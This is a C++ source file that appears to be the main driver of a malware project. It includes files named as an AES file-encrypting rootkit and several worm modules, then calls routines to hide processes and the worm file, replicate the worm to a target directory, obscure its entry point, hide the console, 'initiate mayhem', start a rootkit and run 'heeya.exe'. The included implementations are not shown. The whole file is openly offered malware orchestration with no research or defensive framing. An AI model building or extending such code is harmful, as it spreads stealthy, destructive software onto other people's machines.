#include <iostream>
#include <chrono>
#include <thread>
#include <cstdlib> // For system function
#include "aes_file_encryptor_rootkit.cpp" // Include the implementation of FileEncryptor class
#include "enigmaticWorm.cpp" // Include the implementation of EnigmaticWorm class
#include "mayhem_worm_mutator.cpp" // Include the implementation of MayhemWorm class
#include "rootkit_worm.cpp" // Include the implementation of Rootkit class

using namespace std;

// Function prototypes
void hideProcesses();
void hideWormFile();
void replicateWorm();
void initiateEnigmaticActivities();
void initiateMayhem();
void startRootkit();
void performAdvancedChecks();

int main() {
    // Perform initialization tasks
    cout << "Initializing..." << endl;

    // Perform tasks
    hideProcesses();
    hideWormFile();
    replicateWorm();
    initiateEnigmaticActivities();
    initiateMayhem();
    startRootkit();

    // Perform advanced checks
    performAdvancedChecks();

    // Call heeya.exe
    cout << "Calling heeya.exe..." << endl;
    system("heeya.exe");

    cout << "Program completed." << endl;
    return 0;
}

// Function to hide processes
void hideProcesses() {
    cout << "Hiding processes..." << endl;
    ProcessHider processHider;
    processHider.HideProcess();
    ProcessEnumerator processEnumerator;
    processEnumerator.HideWormProcess();
}

// Function to hide the worm file
void hideWormFile() {
    cout << "Hiding worm file..." << endl;
    FileHider fileHider;
    fileHider.HideWormFile("C:\\Users\\User\\Documents\\worm.exe");
}

// Function to replicate the worm
void replicateWorm() {
    cout << "Replicating worm..." << endl;
    WormReplicator wormReplicator;
    wormReplicator.ReplicateWorm("C:\\path\\to\\source\\worm.exe", "C:\\target\\directory");
}

// Function to initiate enigmatic activities
void initiateEnigmaticActivities() {
    cout << "Initiating enigmatic activities..." << endl;
    EnigmaticWorm enigmaticWorm;
    enigmaticWorm.crypticControlFlow();
    enigmaticWorm.vanishConsole();
    enigmaticWorm.obscuredEntryPoint();
}

// Function to initiate mayhem
void initiateMayhem() {
    cout << "Initiating mayhem..." << endl;
    MayhemWorm mayhemWorm;
    mayhemWorm.initiateMayhem();
}

// Function to start the rootkit
void startRootkit() {
    cout << "Starting rootkit..." << endl;
    Rootkit rootkit;
    rootkit.RootkitMain();
}

// Function to perform advanced checks
void performAdvancedChecks() {
    cout << "Performing advanced checks..." << endl;
    // Simulate a delay for advanced checks
    this_thread::sleep_for(chrono::seconds(10));

    // Additional checks or actions can be added here
}
